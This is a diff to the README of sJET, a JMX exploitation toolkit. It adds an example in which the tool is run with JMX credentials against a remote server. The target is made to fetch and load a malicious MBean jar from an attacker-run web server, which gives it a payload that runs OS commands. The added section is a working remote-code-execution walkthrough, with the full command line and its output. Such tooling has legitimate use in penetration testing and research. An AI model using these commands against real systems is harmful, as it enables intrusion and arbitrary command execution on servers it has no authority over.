@@ -71,6 +71,28 @@ sJET - siberas JMX Exploitation Toolkit
 h0ng10@rocksteady:~/sjet$
 ```
 
+Installation with JMX credentials (also needs a weak configuration of the server):
+```
+h0ng10@rocksteady:~/sjet$ jython sjet.py 192.168.11.136 9991 super_secret install http://192.168.11.132:8000 8000 --jmxrole JMXUSER --jmxpassword JMXPASSWORD
+sJET - siberas JMX Exploitation Toolkit
+=======================================
+[+] Starting webserver at port 8000
+[+] Connecting to: service:jmx:rmi:///jndi/rmi://192.168.11.136:9991/jmxrmi
+[+] Using credentials: JMXUSER / JMXPASSWORD
+[+] Connected: rmi://192.168.11.132  1
+[+] Loaded javax.management.loading.MLet
+[+] Loading malicious MBean from http://192.168.11.132:8000
+[+] Invoking: javax.management.loading.MLet.getMBeansFromURL
+192.168.11.136 - - [22/Aug/2017 22:38:00] "GET / HTTP/1.1" 200 -
+192.168.11.136 - - [22/Aug/2017 22:38:00] "GET /siberas_mlet.jar HTTP/1.1" 200 -
+[+] Successfully loaded MBeanSiberas:name=payload,id=1
+[+] Changing default password...
+[+] Loaded de.siberas.lab.SiberasPayload
+[+] Successfully changed password
+
+h0ng10@rocksteady:~/sjet$
+```
+
 ### Running the command 'ls -la' in a Linux target:
 
 After the payload was installed, we can use it to execute OS commands on the target.
@@ -185,7 +207,7 @@ sJET - siberas JMX Exploitation Toolkit
 [+] MBean correctly uninstalled
 minmaxer@prellermbp:~/sjet$
 ```
-	
+
 
 ## Contributing
 
